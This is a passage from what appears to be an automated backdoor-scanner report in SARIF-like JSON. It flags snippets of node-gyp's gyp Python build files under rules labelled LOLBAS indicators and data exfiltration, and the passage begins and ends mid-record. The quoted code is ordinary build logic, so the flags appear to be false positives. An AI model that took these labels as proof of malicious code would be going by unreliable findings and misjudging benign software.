                      "markdown": "`    \"\"\"Calculate the generator specific info that gets fed to input (called by\n    gyp).\"\"\"\n    generator_flags = params.get(\"generator_flags\", {})\n    android_ndk_version = generator_flags.get(\"android_ndk_version\", None)\n    # Android NDK requires a strict link order.\n    if android_ndk_version:\n        global generator_wants_sorted_dependencies\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 115,
                  "startColumn": 28,
                  "endLine": 115,
                  "endColumn": 33,
                  "snippet": {
                    "text": "def CalculateGeneratorInputInfo(params):\n    \"\"\"Calculate the generator specific info that gets fed to input (called by\n    gyp).\"\"\"\n    generator_flags = params.get(\"generator_flags\", {})\n    android_ndk_version = generator_flags.get(\"android_ndk_version\", None)\n    # Android NDK requires a strict link order.\n    if android_ndk_version:\n",
                    "rendered": {
                      "text": "def CalculateGeneratorInputInfo(params):\n    \"\"\"Calculate the generator specific info that gets fed to input (called by\n    gyp).\"\"\"\n    generator_flags = params.get(\"generator_flags\", {})\n    android_ndk_version = generator_flags.get(\"android_ndk_version\", None)\n    # Android NDK requires a strict link order.\n    if android_ndk_version:\n",
                      "markdown": "`def CalculateGeneratorInputInfo(params):\n    \"\"\"Calculate the generator specific info that gets fed to input (called by\n    gyp).\"\"\"\n    generator_flags = params.get(\"generator_flags\", {})\n    android_ndk_version = generator_flags.get(\"android_ndk_version\", None)\n    # Android NDK requires a strict link order.\n    if android_ndk_version:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/simple_copy.py"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 17,
                  "endLine": 28,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    except KeyError:\n        raise Error(\n            \"Unsupported type %s for deepcopy. Use copy.deepcopy \"\n            + \"or expand simple_copy support.\" % type(x)\n        )\n\n\n",
                    "rendered": {
                      "text": "    except KeyError:\n        raise Error(\n            \"Unsupported type %s for deepcopy. Use copy.deepcopy \"\n            + \"or expand simple_copy support.\" % type(x)\n        )\n\n\n",
                      "markdown": "`    except KeyError:\n        raise Error(\n            \"Unsupported type %s for deepcopy. Use copy.deepcopy \"\n            + \"or expand simple_copy support.\" % type(x)\n        )\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/simple_copy.py"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 17,
                  "endLine": 28,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    except KeyError:\n        raise Error(\n            \"Unsupported type %s for deepcopy. Use copy.deepcopy \"\n            + \"or expand simple_copy support.\" % type(x)\n        )\n\n\n",
                    "rendered": {
                      "text": "    except KeyError:\n        raise Error(\n            \"Unsupported type %s for deepcopy. Use copy.deepcopy \"\n            + \"or expand simple_copy support.\" % type(x)\n        )\n\n\n",
                      "markdown": "`    except KeyError:\n        raise Error(\n            \"Unsupported type %s for deepcopy. Use copy.deepcopy \"\n            + \"or expand simple_copy support.\" % type(x)\n        )\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/mac_tool.py"
                },
                "region": {
                  "startLine": 754,
                  "startColumn": 39,
                  "endLine": 754,
                  "endColumn": 43,
                  "snippet": {
                    "text": "            next_offset = suffix_offset + len(os.path.basename(path)) + 1\n            out.write(struct.pack(\"<LLL\", key_offset, prefix_offset, suffix_offset))\n\n    # Pad byte since next offset starts at 1.\n    out.write(struct.pack(\"<x\"))\n\n    for bucket in buckets:\n",
                    "rendered": {
                      "text": "            next_offset = suffix_offset + len(os.path.basename(path)) + 1\n            out.write(struct.pack(\"<LLL\", key_offset, prefix_offset, suffix_offset))\n\n    # Pad byte since next offset starts at 1.\n    out.write(struct.pack(\"<x\"))\n\n    for bucket in buckets:\n",
                      "markdown": "`            next_offset = suffix_offset + len(os.path.basename(path)) + 1\n            out.write(struct.pack(\"<LLL\", key_offset, prefix_offset, suffix_offset))\n\n    # Pad byte since next offset starts at 1.\n    out.write(struct.pack(\"<x\"))\n\n    for bucket in buckets:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/mac_tool.py"
                },
                "region": {
                  "startLine": 705,
                  "startColumn": 20,
                  "endLine": 705,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\n  The implementation below and the comment above comes from inspecting:\n    http://www.opensource.apple.com/source/distcc/distcc-2503/distcc_dist/include_server/headermap.py?txt\n  while also looking at the implementation in clang in:\n    https://llvm.org/svn/llvm-project/cfe/trunk/lib/Lex/HeaderMap.cpp\n  \"\"\"\n    magic = 1751998832\n",
                    "rendered": {
                      "text": "\n  The implementation below and the comment above comes from inspecting:\n    http://www.opensource.apple.com/source/distcc/distcc-2503/distcc_dist/include_server/headermap.py?txt\n  while also looking at the implementation in clang in:\n    https://llvm.org/svn/llvm-project/cfe/trunk/lib/Lex/HeaderMap.cpp\n  \"\"\"\n    magic = 1751998832\n",
                      "markdown": "`\n  The implementation below and the comment above comes from inspecting:\n    http://www.opensource.apple.com/source/distcc/distcc-2503/distcc_dist/include_server/headermap.py?txt\n  while also looking at the implementation in clang in:\n    https://llvm.org/svn/llvm-project/cfe/trunk/lib/Lex/HeaderMap.cpp\n  \"\"\"\n    magic = 1751998832\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/mac_tool.py"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 62,
                  "endLine": 143,
                  "endColumn": 66,
                  "snippet": {
                    "text": "        input_code = self._DetectInputEncoding(source) or \"UTF-8\"\n\n        # Xcode's CpyCopyStringsFile / builtin-copyStrings seems to call\n        # CFPropertyListCreateFromXMLData() behind the scenes; at least it prints\n        #     CFPropertyListCreateFromXMLData(): Old-style plist parser: missing\n        #     semicolon in dictionary.\n        # on invalid files. Do the same kind of validation.\n",
                    "rendered": {
                      "text": "        input_code = self._DetectInputEncoding(source) or \"UTF-8\"\n\n        # Xcode's CpyCopyStringsFile / builtin-copyStrings seems to call\n        # CFPropertyListCreateFromXMLData() behind the scenes; at least it prints\n        #     CFPropertyListCreateFromXMLData(): Old-style plist parser: missing\n        #     semicolon in dictionary.\n        # on invalid files. Do the same kind of validation.\n",
                      "markdown": "`        input_code = self._DetectInputEncoding(source) or \"UTF-8\"\n\n        # Xcode's CpyCopyStringsFile / builtin-copyStrings seems to call\n        # CFPropertyListCreateFromXMLData() behind the scenes; at least it prints\n        #     CFPropertyListCreateFromXMLData(): Old-style plist parser: missing\n        #     semicolon in dictionary.\n        # on invalid files. Do the same kind of validation.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/mac_tool.py"
                },
                "region": {
                  "startLine": 547,
                  "startColumn": 23,
                  "endLine": 547,
                  "endColumn": 29,
                  "snippet": {
                    "text": "                    )\n        if not valid_provisioning_profiles:\n            print(\n                \"cannot find mobile provisioning for %s\" % (bundle_identifier),\n                file=sys.stderr,\n            )\n            sys.exit(1)\n",
                    "rendered": {
                      "text": "                    )\n        if not valid_provisioning_profiles:\n            print(\n                \"cannot find mobile provisioning for %s\" % (bundle_identifier),\n                file=sys.stderr,\n            )\n            sys.exit(1)\n",
                      "markdown": "`                    )\n        if not valid_provisioning_profiles:\n            print(\n                \"cannot find mobile provisioning for %s\" % (bundle_identifier),\n                file=sys.stderr,\n            )\n            sys.exit(1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/mac_tool.py"
                },
                "region": {
                  "startLine": 518,
                  "startColumn": 23,
                  "endLine": 518,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        )\n        if not os.path.isdir(profiles_dir):\n            print(\n                \"cannot find mobile provisioning for %s\" % (bundle_identifier),\n                file=sys.stderr,\n            )\n            sys.exit(1)\n",
                    "rendered": {
                      "text": "        )\n        if not os.path.isdir(profiles_dir):\n            print(\n                \"cannot find mobile provisioning for %s\" % (bundle_identifier),\n                file=sys.stderr,\n            )\n            sys.exit(1)\n",
                      "markdown": "`        )\n        if not os.path.isdir(profiles_dir):\n            print(\n                \"cannot find mobile provisioning for %s\" % (bundle_identifier),\n                file=sys.stderr,\n            )\n            sys.exit(1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/mac_tool.py"
                },
                "region": {
                  "startLine": 312,
                  "startColumn": 9,
                  "endLine": 312,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    def ExecPackageFramework(self, framework, version):\n        \"\"\"Takes a path to Something.framework and the Current version of that and\n    sets up all the symlinks.\"\"\"\n        # Find the name of the binary based on the part before the \".framework\".\n        binary = os.path.basename(framework).split(\".\")[0]\n\n        CURRENT = \"Current\"\n",
                    "rendered": {
                      "text": "    def ExecPackageFramework(self, framework, version):\n        \"\"\"Takes a path to Something.framework and the Current version of that and\n    sets up all the symlinks.\"\"\"\n        # Find the name of the binary based on the part before the \".framework\".\n        binary = os.path.basename(framework).split(\".\")[0]\n\n        CURRENT = \"Current\"\n",
                      "markdown": "`    def ExecPackageFramework(self, framework, version):\n        \"\"\"Takes a path to Something.framework and the Current version of that and\n    sets up all the symlinks.\"\"\"\n        # Find the name of the binary based on the part before the \".framework\".\n        binary = os.path.basename(framework).split(\".\")[0]\n\n        CURRENT = \"Current\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/mac_tool.py"
                },
                "region": {
                  "startLine": 292,
                  "startColumn": 9,
                  "endLine": 292,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        return libtoolout.returncode\n\n    def ExecPackageIosFramework(self, framework):\n        # Find the name of the binary based on the part before the \".framework\".\n        binary = os.path.basename(framework).split(\".\")[0]\n        module_path = os.path.join(framework, \"Modules\")\n        if not os.path.exists(module_path):\n",
                    "rendered": {
                      "text": "        return libtoolout.returncode\n\n    def ExecPackageIosFramework(self, framework):\n        # Find the name of the binary based on the part before the \".framework\".\n        binary = os.path.basename(framework).split(\".\")[0]\n        module_path = os.path.join(framework, \"Modules\")\n        if not os.path.exists(module_path):\n",
                      "markdown": "`        return libtoolout.returncode\n\n    def ExecPackageIosFramework(self, framework):\n        # Find the name of the binary based on the part before the \".framework\".\n        binary = os.path.basename(framework).split(\".\")[0]\n        module_path = os.path.join(framework, \"Modules\")\n        if not os.path.exists(module_path):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/mac_tool.py"
                },
                "region": {
                  "startLine": 271,
                  "startColumn": 7,
                  "endLine": 271,
                  "endColumn": 12,
                  "snippet": {
                    "text": "            + r\".* the table of contents is empty \"\n            + r\"\\(no object file members in the library define global symbols\\)$\"\n        )\n        env = os.environ.copy()\n        # Ref:\n        # http://www.opensource.apple.com/source/cctools/cctools-809/misc/libtool.c\n        # The problem with this flag is that it resets the file mtime on the file to\n",
                    "rendered": {
                      "text": "            + r\".* the table of contents is empty \"\n            + r\"\\(no object file members in the library define global symbols\\)$\"\n        )\n        env = os.environ.copy()\n        # Ref:\n        # http://www.opensource.apple.com/source/cctools/cctools-809/misc/libtool.c\n        # The problem with this flag is that it resets the file mtime on the file to\n",
                      "markdown": "`            + r\".* the table of contents is empty \"\n            + r\"\\(no object file members in the library define global symbols\\)$\"\n        )\n        env = os.environ.copy()\n        # Ref:\n        # http://www.opensource.apple.com/source/cctools/cctools-809/misc/libtool.c\n        # The problem with this flag is that it resets the file mtime on the file to\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/mac_tool.py"
                },
                "region": {
                  "startLine": 576,
                  "startColumn": 43,
                  "endLine": 576,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        \"\"\"Merge |plist| into |merged_plist|.\"\"\"\n        for key, value in plist.items():\n            if isinstance(value, dict):\n                merged_value = merged_plist.get(key, {})\n                if isinstance(merged_value, dict):\n                    self._MergePlist(merged_value, value)\n                    merged_plist[key] = merged_value\n",
                    "rendered": {
                      "text": "        \"\"\"Merge |plist| into |merged_plist|.\"\"\"\n        for key, value in plist.items():\n            if isinstance(value, dict):\n                merged_value = merged_plist.get(key, {})\n                if isinstance(merged_value, dict):\n                    self._MergePlist(merged_value, value)\n                    merged_plist[key] = merged_value\n",
                      "markdown": "`        \"\"\"Merge |plist| into |merged_plist|.\"\"\"\n        for key, value in plist.items():\n            if isinstance(value, dict):\n                merged_value = merged_plist.get(key, {})\n                if isinstance(merged_value, dict):\n                    self._MergePlist(merged_value, value)\n                    merged_plist[key] = merged_value\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/mac_tool.py"
                },
                "region": {
                  "startLine": 537,
                  "startColumn": 47,
                  "endLine": 537,
                  "endColumn": 52,
                  "snippet": {
                    "text": "            app_id_pattern = profile_data.get(\"Entitlements\", {}).get(\n                \"application-identifier\", \"\"\n            )\n            for team_identifier in profile_data.get(\"TeamIdentifier\", []):\n                app_id = f\"{team_identifier}.{bundle_identifier}\"\n                if fnmatch.fnmatch(app_id, app_id_pattern):\n                    valid_provisioning_profiles[app_id_pattern] = (\n",
                    "rendered": {
                      "text": "            app_id_pattern = profile_data.get(\"Entitlements\", {}).get(\n                \"application-identifier\", \"\"\n            )\n            for team_identifier in profile_data.get(\"TeamIdentifier\", []):\n                app_id = f\"{team_identifier}.{bundle_identifier}\"\n                if fnmatch.fnmatch(app_id, app_id_pattern):\n                    valid_provisioning_profiles[app_id_pattern] = (\n",
                      "markdown": "`            app_id_pattern = profile_data.get(\"Entitlements\", {}).get(\n                \"application-identifier\", \"\"\n            )\n            for team_identifier in profile_data.get(\"TeamIdentifier\", []):\n                app_id = f\"{team_identifier}.{bundle_identifier}\"\n                if fnmatch.fnmatch(app_id, app_id_pattern):\n                    valid_provisioning_profiles[app_id_pattern] = (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/mac_tool.py"
                },
                "region": {
                  "startLine": 534,
                  "startColumn": 65,
                  "endLine": 534,
                  "endColumn": 70,
                  "snippet": {
                    "text": "        valid_provisioning_profiles = {}\n        for profile_path in provisioning_profiles:\n            profile_data = self._LoadProvisioningProfile(profile_path)\n            app_id_pattern = profile_data.get(\"Entitlements\", {}).get(\n                \"application-identifier\", \"\"\n            )\n            for team_identifier in profile_data.get(\"TeamIdentifier\", []):\n",
                    "rendered": {
                      "text": "        valid_provisioning_profiles = {}\n        for profile_path in provisioning_profiles:\n            profile_data = self._LoadProvisioningProfile(profile_path)\n            app_id_pattern = profile_data.get(\"Entitlements\", {}).get(\n                \"application-identifier\", \"\"\n            )\n            for team_identifier in profile_data.get(\"TeamIdentifier\", []):\n",
                      "markdown": "`        valid_provisioning_profiles = {}\n        for profile_path in provisioning_profiles:\n            profile_data = self._LoadProvisioningProfile(profile_path)\n            app_id_pattern = profile_data.get(\"Entitlements\", {}).get(\n                \"application-identifier\", \"\"\n            )\n            for team_identifier in profile_data.get(\"TeamIdentifier\", []):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/mac_tool.py"
                },
                "region": {
                  "startLine": 534,
                  "startColumn": 41,
                  "endLine": 534,
                  "endColumn": 46,
                  "snippet": {
                    "text": "        valid_provisioning_profiles = {}\n        for profile_path in provisioning_profiles:\n            profile_data = self._LoadProvisioningProfile(profile_path)\n            app_id_pattern = profile_data.get(\"Entitlements\", {}).get(\n                \"application-identifier\", \"\"\n            )\n            for team_identifier in profile_data.get(\"TeamIdentifier\", []):\n",
                    "rendered": {
                      "text": "        valid_provisioning_profiles = {}\n        for profile_path in provisioning_profiles:\n            profile_data = self._LoadProvisioningProfile(profile_path)\n            app_id_pattern = profile_data.get(\"Entitlements\", {}).get(\n                \"application-identifier\", \"\"\n            )\n            for team_identifier in profile_data.get(\"TeamIdentifier\", []):\n",
                      "markdown": "`        valid_provisioning_profiles = {}\n        for profile_path in provisioning_profiles:\n            profile_data = self._LoadProvisioningProfile(profile_path)\n            app_id_pattern = profile_data.get(\"Entitlements\", {}).get(\n                \"application-identifier\", \"\"\n            )\n            for team_identifier in profile_data.get(\"TeamIdentifier\", []):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/mac_tool.py"
                },
                "region": {
                  "startLine": 245,
                  "startColumn": 30,
                  "endLine": 245,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        # The format of PkgInfo is eight characters, representing the bundle type\n        # and bundle signature, each four characters. If that is missing, four\n        # '?' characters are used instead.\n        signature_code = plist.get(\"CFBundleSignature\", \"????\")\n        if len(signature_code) != 4:  # Wrong length resets everything, too.\n            signature_code = \"?\" * 4\n\n",
                    "rendered": {
                      "text": "        # The format of PkgInfo is eight characters, representing the bundle type\n        # and bundle signature, each four characters. If that is missing, four\n        # '?' characters are used instead.\n        signature_code = plist.get(\"CFBundleSignature\", \"????\")\n        if len(signature_code) != 4:  # Wrong length resets everything, too.\n            signature_code = \"?\" * 4\n\n",
                      "markdown": "`        # The format of PkgInfo is eight characters, representing the bundle type\n        # and bundle signature, each four characters. If that is missing, four\n        # '?' characters are used instead.\n        signature_code = plist.get(\"CFBundleSignature\", \"????\")\n        if len(signature_code) != 4:  # Wrong length resets everything, too.\n            signature_code = \"?\" * 4\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/mac_tool.py"
                },
                "region": {
                  "startLine": 632,
                  "startColumn": 15,
                  "endLine": 632,
                  "endColumn": 30,
                  "snippet": {
                    "text": "      Value of CFBundleIdentifier in the Info.plist located in the bundle.\n    \"\"\"\n        info_plist_path = os.path.join(\n            os.environ[\"TARGET_BUILD_DIR\"], os.environ[\"INFOPLIST_PATH\"]\n        )\n        info_plist_data = self._LoadPlistMaybeBinary(info_plist_path)\n        return info_plist_data[\"CFBundleIdentifier\"]\n",
                    "rendered": {
                      "text": "      Value of CFBundleIdentifier in the Info.plist located in the bundle.\n    \"\"\"\n        info_plist_path = os.path.join(\n            os.environ[\"TARGET_BUILD_DIR\"], os.environ[\"INFOPLIST_PATH\"]\n        )\n        info_plist_data = self._LoadPlistMaybeBinary(info_plist_path)\n        return info_plist_data[\"CFBundleIdentifier\"]\n",
                      "markdown": "`      Value of CFBundleIdentifier in the Info.plist located in the bundle.\n    \"\"\"\n        info_plist_path = os.path.join(\n            os.environ[\"TARGET_BUILD_DIR\"], os.environ[\"INFOPLIST_PATH\"]\n        )\n        info_plist_data = self._LoadPlistMaybeBinary(info_plist_path)\n        return info_plist_data[\"CFBundleIdentifier\"]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/mac_tool.py"
                },
                "region": {
                  "startLine": 410,
                  "startColumn": 23,
                  "endLine": 410,
                  "endColumn": 56,
                  "snippet": {
                    "text": "                    \"--target-device\",\n                    \"mac\",\n                    \"--minimum-deployment-target\",\n                    os.environ[\"MACOSX_DEPLOYMENT_TARGET\"],\n                    \"--compile\",\n                    os.path.abspath(os.environ[\"UNLOCALIZED_RESOURCES_FOLDER_PATH\"]),\n                ]\n",
                    "rendered": {
                      "text": "                    \"--target-device\",\n                    \"mac\",\n                    \"--minimum-deployment-target\",\n                    os.environ[\"MACOSX_DEPLOYMENT_TARGET\"],\n                    \"--compile\",\n                    os.path.abspath(os.environ[\"UNLOCALIZED_RESOURCES_FOLDER_PATH\"]),\n                ]\n",
                      "markdown": "`                    \"--target-device\",\n                    \"mac\",\n                    \"--minimum-deployment-target\",\n                    os.environ[\"MACOSX_DEPLOYMENT_TARGET\"],\n                    \"--compile\",\n                    os.path.abspath(os.environ[\"UNLOCALIZED_RESOURCES_FOLDER_PATH\"]),\n                ]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/mac_tool.py"
                },
                "region": {
                  "startLine": 397,
                  "startColumn": 23,
                  "endLine": 397,
                  "endColumn": 58,
                  "snippet": {
                    "text": "                    \"--target-device\",\n                    \"ipad\",\n                    \"--minimum-deployment-target\",\n                    os.environ[\"IPHONEOS_DEPLOYMENT_TARGET\"],\n                    \"--compile\",\n                    os.path.abspath(os.environ[\"CONTENTS_FOLDER_PATH\"]),\n                ]\n",
                    "rendered": {
                      "text": "                    \"--target-device\",\n                    \"ipad\",\n                    \"--minimum-deployment-target\",\n                    os.environ[\"IPHONEOS_DEPLOYMENT_TARGET\"],\n                    \"--compile\",\n                    os.path.abspath(os.environ[\"CONTENTS_FOLDER_PATH\"]),\n                ]\n",
                      "markdown": "`                    \"--target-device\",\n                    \"ipad\",\n                    \"--minimum-deployment-target\",\n                    os.environ[\"IPHONEOS_DEPLOYMENT_TARGET\"],\n                    \"--compile\",\n                    os.path.abspath(os.environ[\"CONTENTS_FOLDER_PATH\"]),\n                ]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/mac_tool.py"
                },
                "region": {
                  "startLine": 107,
                  "startColumn": 27,
                  "endLine": 107,
                  "endColumn": 60,
                  "snippet": {
                    "text": "                        \"--target-device\",\n                        \"mac\",\n                        \"--minimum-deployment-target\",\n                        os.environ[\"MACOSX_DEPLOYMENT_TARGET\"],\n                    ]\n                )\n\n",
                    "rendered": {
                      "text": "                        \"--target-device\",\n                        \"mac\",\n                        \"--minimum-deployment-target\",\n                        os.environ[\"MACOSX_DEPLOYMENT_TARGET\"],\n                    ]\n                )\n\n",
                      "markdown": "`                        \"--target-device\",\n                        \"mac\",\n                        \"--minimum-deployment-target\",\n                        os.environ[\"MACOSX_DEPLOYMENT_TARGET\"],\n                    ]\n                )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/mac_tool.py"
                },
                "region": {
                  "startLine": 98,
                  "startColumn": 27,
                  "endLine": 98,
                  "endColumn": 62,
                  "snippet": {
